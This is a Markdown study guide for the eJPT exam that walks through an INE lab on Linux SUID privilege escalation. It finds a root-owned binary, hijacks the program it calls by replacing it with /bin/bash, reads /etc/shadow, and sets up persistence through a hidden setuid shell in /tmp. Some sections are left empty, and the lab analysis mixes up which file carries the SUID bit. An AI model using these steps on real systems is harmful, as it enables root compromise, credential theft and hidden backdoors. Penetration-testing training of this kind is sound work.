# üîß SUID/SGID Exploitation - Complete Privilege Escalation Guide

**Complete step-by-step guide for exploiting SUID (Set User ID) and SGID (Set Group ID) programs for privilege escalation in penetration testing and eJPT exam scenarios.**

**üìç File Location:** `07-exploitation/setuid-exploitation-complete.md`

---

## üéØ What is SUID/SGID Exploitation?

SUID (Set User ID) and SGID (Set Group ID) are special permission bits in Linux systems that allow programs to run with the privileges of their owner or group, instead of the user who executes them. Think of it like having a special key that gives you temporary admin access when you use certain programs.

### üîç **What SUID/SGID Does:**
- **SUID Programs** run with the owner's permissions (often root)
- **SGID Programs** run with the group's permissions
- **Temporary Privilege** elevation for specific tasks
- **System Administration** functions like changing passwords
- **Potential Security Risk** if misconfigured or vulnerable

### üí° **Why This Matters for eJPT:**
SUID/SGID exploitation is a fundamental privilege escalation technique in Linux systems. When these permissions are misconfigured or the programs contain vulnerabilities, they can be exploited to gain root access. This appears frequently in eJPT exam scenarios and real-world penetration testing.

### üö™ **Common Attack Methods:**
- **Binary Replacement** attacks by substituting legitimate programs
- **Path Hijacking** through insecure PATH variables
- **Symlink Attacks** using symbolic links to redirect execution
- **Environment Variable** manipulation to control program behavior

---

## üì¶ Installation and Setup

### **Already Available On:**
- ‚úÖ All Linux distributions
- ‚úÖ Kali Linux
- ‚úÖ Ubuntu and derivatives
- ‚úÖ Most penetration testing environments

### **Check If Everything Works:**
```bash
# Check if required tools are available
which find strings file ls cp chmod

# Verify you have basic access
whoami
# Expected output: Current username

# Check current privileges
id
# Expected output: uid=1000(student) gid=1000(student) groups=...

# Test basic find command
find /usr/bin -name "passwd" -type f
# Expected output: /usr/bin/passwd (or similar)
```

### **Basic Requirements:**
- Terminal access to Linux system
- Basic understanding of Linux file permissions
- Ability to read file permissions (ls -la)
- Understanding of user/group concepts

---

## üîß Basic Usage and Simple Steps

### **üìã Simple Attack Process:**
1. **üîç Find SUID/SGID:** Locate binaries with special permissions
2. **üìä Analyze Programs:** Understand what each program does
3. **üîç Look for Vulnerabilities:** Find exploitable weaknesses
4. **üîì Exploit Weakness:** Use vulnerability to escalate privileges
5. **‚úÖ Verify Success:** Confirm you have higher privileges

### **‚öôÔ∏è Basic Command Structure:**
```bash
# Find SUID binaries
find / -type f -perm -4000 2>/dev/null

# Check file permissions and details
ls -la /path/to/binary

# Analyze binary content
strings /path/to/binary

# Basic exploitation (example)

## üß™ Step-by-Step Lab Walkthrough

### **Lab Scenario: Complete SUID Exploitation From Discovery to Root**

**Target:** target.ine.local (accessed via web terminal)
**Goal:** Escalate from student user to root privileges
**Time Needed:** 10-15 minutes

---

### **Step 1: Verify Connectivity and Access**

**What We're Doing:** Making sure we can reach the target system and access it

#### **Command Used:**
```bash
ping -c 4 target.ine.local
```

#### **What Happened:**
```bash
PING target.ine.local (192.74.191.3) 56(84) bytes of data.
64 bytes from target.ine.local (192.74.191.3): icmp_seq=1 ttl=64 time=0.093 ms
64 bytes from target.ine.local (192.74.191.3): icmp_seq=2 ttl=64 time=0.063 ms
64 bytes from target.ine.local (192.74.191.3): icmp_seq=3 ttl=64 time=0.053 ms
64 bytes from target.ine.local (192.74.191.3): icmp_seq=4 ttl=64 time=0.050 ms

--- target.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3069ms
rtt min/avg/max/mdev = 0.050/0.064/0.093/0.017 ms
```

#### **üéØ What This Means:**
- **Target is reachable** - All ping packets successful
- **Network latency is low** - Fast response times (under 1ms)
- **Target IP is 192.74.191.3** - Internal network address
- **System is responsive** - Ready for further exploitation

#### **Next Step:**
Access the web-based terminal at http://target.ine.local:8000

---

### **Step 2: Access Target System Terminal**

**What We're Doing:** Getting command line access to the target system

#### **Access Method:**
1. Open web browser
2. Navigate to: `http://target.ine.local:8000`
3. You'll see a terminal interface

#### **What You See:**
```bash
student@target:~$
```

#### **üîç What This Terminal Prompt Tells Us:**
- **Username:** student (we're logged in as student user)
- **Hostname:** target (the target machine name)
- **Current Directory:** ~ (home directory)
- **User Type:** $ (regular user, not root - root would show #)

#### **Check Current Privileges:**
```bash
id
whoami
```

**Expected Output:**
```bash
student@target:~$ whoami
student
student@target:~$ id
uid=1000(student) gid=1000(student) groups=1000(student)
```

This confirms we're starting as a regular user with limited privileges.

---

### **Step 3: Explore Current Directory for SUID Programs**

**What We're Doing:** Looking for files in our current location that might have special permissions

#### **Command Used:**
```bash
ls -l
```

#### **What Happened:**
```bash
student@target:~$ ls -l
total 24
-rwsr-sr-x 1 root root 8296 Sep 22  2018 greetings
-rwxr-xr-x 1 root root 8344 Sep 22  2018 welcome
```

#### **üîç Detailed Analysis of File Permissions:**

**File 1: greetings**
```
-rwsr-sr-x 1 root root 8296 Sep 22  2018 greetings
```
- **First character:** `-` = regular file
- **Owner permissions:** `rws` = read, write, **SUID** (the 's' is crucial!)
- **Group permissions:** `r-x` = read and execute
- **Others permissions:** `r-x` = read and execute
- **Owner:** root (this program belongs to root)
- **SUID bit:** The 's' means this program runs with root privileges!

**File 2: welcome**
```
-rwxr-xr-x 1 root root 8344 Sep 22  2018 welcome
```
- **No SUID bit** - this is a regular executable
- **Also owned by root** but no special permissions

#### **üéØ Key Discovery:**
We found a SUID binary called `greetings` that runs with root privileges!

---

### **Step 4: Analyze the Welcome Binary**

**What We're Doing:** Understanding what the welcome program does and how it works

#### **Command Used:**
```bash
file welcome
```

#### **What Happened:**
```bash
student@target:~$ file welcome
welcome: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=50cbde06edc07f86a00d0547778c500d4dd85df3, for GNU/Linux 3.2.0, BuildID[sha1]=50cbde06edc07f86a00d0547778c500d4dd85df3, not stripped
```

#### **üîç What This File Information Tells Us:**
- **setuid** - Confirms this binary has SUID permissions
- **ELF binary** - Linux executable format
- **64-bit** - Compiled for 64-bit systems
- **Dynamically linked** - Uses system libraries
- **Not stripped** - Debug information still present (easier to analyze)

#### **Test the Program:**
```bash
./welcome
```

**Expected Output:**
```bash
student@target:~$ ./welcome
Welcome to Attack Defense Labs
student@target:~$
```

The program simply displays a welcome message and exits.

---

### **Step 5: Deep Binary Analysis with Strings**

**What We're Doing:** Looking inside the welcome binary to understand its internal behavior

#### **Command Used:**
```bash
strings welcome
```

#### **What Happened:**
```bash
student@target:~$ strings welcome
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
ITM_deregisterTMCloneTable
__gmon_start__
ITM_registerTMCloneTable
AWAVAUATUHSL
[]A\A]A^A_
greetings
GCC: (Ubuntu 7.3.0-16ubuntu3) 7.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7696
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
welcome.c
__FRAME_END__
__init_array_end
_DYNAMIC
```

#### **üîç Critical Discovery in the Strings Output:**

The most important finding is this line:
```
greetings
```

**What This Means:**
- The `welcome` program calls another program named `greetings`
- It doesn't use the full path (like `/usr/bin/greetings`)
- It just calls `greetings` directly
- This creates a **path hijacking vulnerability**!

#### **Additional Important Strings:**
- **`system`** - The program uses system() function to execute commands
- **`setuid`** - Confirms SUID functionality
- **`libc.so.6`** - Uses standard C library

---

### **Step 6: Understanding the Vulnerability**

**What We're Doing:** Analyzing how we can exploit the program's behavior

#### **The Vulnerability Explained:**

1. **Program Flow:**
   - User runs `./welcome`
   - Welcome program (running with root privileges due to SUID)
   - Welcome program calls `greetings` using system() function
   - System looks for `greetings` program in current directory first
   - Greetings program executes and displays message

2. **The Security Flaw:**
   - The welcome program doesn't use absolute path for greetings
   - It trusts whatever `greetings` file exists in the current directory
   - If we replace `greetings` with our own program, `welcome` will run it
   - Since `welcome` has SUID, our replacement runs with root privileges!

#### **Attack Plan:**
1. Remove the original `greetings` binary
2. Replace it with a copy of `/bin/bash` (shell)
3. Name the shell copy `greetings`
4. Run `./welcome` again
5. Welcome will execute our fake `greetings` (which is actually bash)
6. Bash will run with root privileges!

---

### **Step 7: Execute the Attack - Binary Replacement**

**What We're Doing:** Implementing our attack plan to gain root privileges

#### **Step 7.1: Remove Original Greetings Binary**
```bash
rm greetings
```

**What Happened:**
```bash
student@target:~$ rm greetings
rm: remove write-protected regular file 'greetings'? y
```

**System Response:** The system asks for confirmation because the file is write-protected. We type `y` to confirm.

#### **Step 7.2: Create Our Malicious Replacement**
```bash
cp /bin/bash greetings
```

**What This Command Does:**
- **cp** = copy command
- **/bin/bash** = source (the system shell)
- **greetings** = destination (our fake greetings program)

**Result:** We now have a file named `greetings` that is actually a copy of the bash shell.

#### **Step 7.3: Verify Our Replacement**
```bash
ls -la greetings
```

**Expected Output:**
```bash
student@target:~$ ls -la greetings
-rwxr-xr-x 1 student student 1113504 Oct  8 14:30 greetings
```

**Analysis:**
- File is now owned by student (us)
- File is executable
- File size matches bash binary
- No SUID bit on our copy (but that's okay - welcome will give us the privileges)

---

### **Step 8: Execute the Exploit**

**What We're Doing:** Running the vulnerable program to trigger our privilege escalation

#### **Command Used:**
```bash
./welcome
```

#### **üéâ The Magic Moment:**
```bash
student@target:~$ ./welcome
root@target:/home/student#
```

#### **üéä Success Analysis:**
- **Prompt changed from `$` to `#`** - Indicates root access!
- **Username changed from `student` to `root`** - We are now root!
- **We have a shell** - Interactive command access with root privileges

#### **Verify Our New Privileges:**
```bash
whoami
```

**Output:**
```bash
root@target:/home/student# whoami
root
```

```bash
id
```

**Output:**
```bash
root@target:/home/student# id
uid=0(root) gid=0(root) groups=0(root)
```

#### **üéØ What These Results Mean:**
- **uid=0** - User ID 0 is always root in Linux
- **gid=0** - Group ID 0 is the root group
- **groups=0(root)** - We belong to the root group
- **Complete Success** - We have maximum privileges on the system!

---

### **Step 9: Explore the System with Root Privileges**

**What We're Doing:** Using our new root access to explore areas previously restricted

#### **Navigate to Root Directory:**
```bash
cd /root
```

**Previous Behavior:** As student user, this would have been denied
**Current Result:** We can access it because we're root!

#### **List Contents of Root Directory:**
```bash
ls
```

**Output:**
```bash
root@target:/root# ls
flag
```

**Discovery:** There's a file called `flag` in the root directory!

#### **Read the Flag File:**
```bash
cat flag
```

**Output:**
```bash
root@target:/root# cat flag
b92bcdc876d52108778e2d81f3b01494
```

#### **üèÜ Mission Accomplished!**
- **Flag Retrieved:** b92bcdc876d52108778e2d81f3b01494
- **Objective Complete:** Successfully escalated privileges from student to root
- **Method Used:** SUID binary exploitation via binary replacement
- **Time Taken:** Approximately 10 minutes

---

### **Step 10: Additional Verification and Exploration**

**What We're Doing:** Confirming our access and exploring additional capabilities

#### **System Information Gathering:**
```bash
# Check system information
uname -a
```

```bash
# Check what other users exist
cat /etc/passwd | grep -E "(root|student)"
```

```bash
# Verify we can access sensitive files
ls -la /etc/shadow
cat /etc/shadow | head -5
```

#### **What This Proves:**
- **Complete system compromise** - Access to all system files
- **Password hash access** - Can read /etc/shadow (normally restricted)
- **Full administrative control** - Can perform any system operation
- **Persistent access** - Could create additional user accounts or backdoors

## ‚ö†Ô∏è Common Problems and How to Fix Them

### **‚ùå Problem 1: Find Command Returns Too Many Results**

**What You See:**
```bash
find / -type f -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/bin/mount
/bin/umount
... (100+ results)
```

**How to Fix:**
```bash
# Step 1: Focus on non-standard locations first
find /home /tmp /opt -type f -perm -4000 2>/dev/null
# Custom binaries are often in these locations

# Step 2: Exclude common system binaries
find / -type f -perm -4000 2>/dev/null | grep -v "/usr/bin" | grep -v "/bin"
# Filter out standard system directories

# Step 3: Look for recently modified files
find / -type f -perm -4000 -newermt "2020-01-01" 2>/dev/null
# Find SUID binaries created after specific date
```

**Strategy Tips:**
- Start with user directories (/home, /tmp)
- Custom vulnerable binaries are rarely in standard system locations
- Look for files with unusual names or recent modification dates

---

### **‚ùå Problem 2: Strings Command Shows No Useful Information**

**What You See:**
```bash
strings suspicious_binary
@#$%^&*
Binary garbage data...
No readable program names
```

**How to Fix:**
```bash
# Step 1: Try different string extraction methods
strings -a binary_name          # Extract all strings
strings -n 3 binary_name        # Minimum 3 characters
strings -e l binary_name        # Little-endian encoding

# Step 2: Check for obfuscation or encoding
hexdump -C binary_name | head -20
# Look at raw binary data

# Step 3: Test the binary directly
strace ./binary_name 2>&1 | grep exec
# See what programs it actually executes

# Step 4: Use alternative analysis
ltrace ./binary_name
# Trace library calls which might reveal behavior
```

**Alternative Approaches:**
- Sometimes binaries use obfuscation - test behavior instead of analyzing code
- Use dynamic analysis (running the program) instead of static analysis
- Look for configuration files or documentation nearby

---

### **‚ùå Problem 3: Binary Replacement Doesn't Work**

**What You See:**
```bash
cp /bin/bash replacement_name
./vulnerable_program
# Still running as regular user, no privilege escalation
```

**How to Fix:**
```bash
# Step 1: Verify the replacement is in correct location
ls -la replacement_name
# Ensure file exists and is executable

# Step 2: Check if program uses absolute paths
strings vulnerable_program | grep "/"
# If you see "/usr/bin/program", it uses full path (harder to exploit)

# Step 3: Try different replacement locations
mkdir /tmp/fakedir
cp /bin/bash /tmp/fakedir/program_name
export PATH=/tmp/fakedir:$PATH
./vulnerable_program
# Modify PATH to prioritize our fake directory

# Step 4: Check for other exploitation methods
# Some binaries might be vulnerable to different attacks:
# - Environment variable manipulation
# - Argument injection
# - Symlink attacks
```

**Troubleshooting Checklist:**
- File permissions correct? (executable)
- Right file name? (exact match of called program)
- Correct directory? (where program expects to find it)
- Program actually vulnerable? (double-check strings output)

---

### **‚ùå Problem 4: Permission Denied When Removing Files**

**What You See:**
```bash
rm original_program
rm: cannot remove 'original_program': Permission denied
```

**How to Fix:**
```bash
# Step 1: Check file attributes
lsattr original_program
# Look for immutable flag (i)

# Step 2: Remove special attributes if present
chattr -i original_program
# Remove immutable flag (if you have permission)

# Step 3: Check directory permissions
ls -la .
# Ensure you can write to current directory

# Step 4: Alternative approach - don't remove, just override
# Instead of removing, create replacement in different location
# and modify PATH or use different exploitation method
```

**Alternative Strategies:**

## üîó Using SUID Exploitation with Other Tools

### **üéØ Complete Attack Chain: Nmap ‚Üí SSH ‚Üí SUID Exploitation**

This shows how SUID exploitation fits into a full penetration testing workflow.

#### **Phase 1: Discovery and Access**
```bash
# Initial network discovery
nmap -sS -sV target_ip
# Service enumeration and version detection

# Gain initial access (various methods)
ssh user@target_ip              # If SSH credentials known
exploit web_vulnerability       # Via web application
social_engineering             # Via phishing/credentials

# Basic enumeration after gaining access
whoami
id
uname -a
ls -la
```

**What This Gives You:**
- Initial foothold on target system
- Basic user account access
- System information for further exploitation
- Foundation for privilege escalation

#### **Phase 2: Privilege Escalation via SUID**
```bash
# Based on initial access, search for SUID binaries
find / -type f -perm -4000 2>/dev/null
find /home -type f -perm -4000 2>/dev/null

# Analyze discovered binaries
for binary in $(find /home -type f -perm -4000 2>/dev/null); do
    echo "=== Analyzing $binary ==="
    ls -la "$binary"
    strings "$binary" | head -20
    echo "---"
done

# Exploit most promising target
cp /bin/bash replacement_name
./vulnerable_suid_binary
```

**Integration Benefits:**
- **Informed Targeting:** Use system information to guide privilege escalation strategy
- **Efficient Exploitation:** Focus on most likely attack vectors based on initial access
- **Comprehensive Coverage:** Multiple tools provide different attack perspectives

#### **Phase 3: Post-Exploitation Activities**
```bash
# After gaining root access via SUID exploitation
whoami
id
hostname

# System information gathering
uname -a
cat /etc/passwd | wc -l
cat /etc/shadow | head -5

# Look for additional attack vectors
find / -name "*.conf" -type f 2>/dev/null | grep -E "(ssh|mysql|apache)"
netstat -tulpn | grep LISTEN

# Establish persistence
cp /bin/bash /tmp/.hidden_shell
chmod +s /tmp/.hidden_shell

# Data collection and lateral movement
find /home -name "*.txt" -o -name "*.doc" -o -name "*.pdf" 2>/dev/null
cat /etc/hosts
arp -a
```

### **üîß Integration with Other Privilege Escalation Techniques:**

#### **Combined Enumeration Approach:**
```bash
# Complete privilege escalation enumeration
echo "=== SUID/SGID Binaries ==="
find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null

echo "=== Writable System Directories ==="
find / -type d -writable 2>/dev/null | grep -E "(bin|sbin|usr)"

echo "=== Sudo Permissions ==="
sudo -l 2>/dev/null

echo "=== Cron Jobs ==="
cat /etc/crontab 2>/dev/null
ls -la /etc/cron* 2>/dev/null

echo "=== Kernel Version ==="
uname -a
cat /proc/version
```

#### **Backup Escalation Methods:**
```bash
# If SUID exploitation fails, try alternatives:

# Method 1: Sudo abuse
sudo -l
# Look for NOPASSWD entries or dangerous sudo permissions

# Method 2: Kernel exploits
uname -a
searchsploit kernel $(uname -r | cut -d- -f1)

# Method 3: Service exploitation
ps aux | grep root
# Look for root services that might be vulnerable

# Method 4: Configuration file abuse
find /etc -name "*.conf" -readable 2>/dev/null | xargs grep -l password
```

### **‚öôÔ∏è Automation Script for Complete SUID Assessment:**
